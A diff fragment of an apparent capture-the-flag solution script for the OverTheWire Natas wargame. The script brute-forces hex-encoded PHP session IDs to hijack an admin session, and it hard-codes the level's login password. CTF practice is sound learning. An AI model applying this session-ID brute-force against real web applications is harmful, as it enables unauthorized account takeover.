@@ -22,7 +22,7 @@ while search == True:
         sessionidhex = binascii.b2a_hex(sessionid)
         sessionidhex = sessionidhex.decode('utf-8')
         Data = {'username' : 'admin', 'PHPSESSID' : sessionidhex }
-        r = requests.post('http://natas18.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), data = Data)
+        r = requests.post('http://natas19.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), data = Data)
         length = len(r.content)
         sessionid_list[sessionid]= length
         #print(f'testing session id:  {sessionid} , hex: {sessionidhex} ')
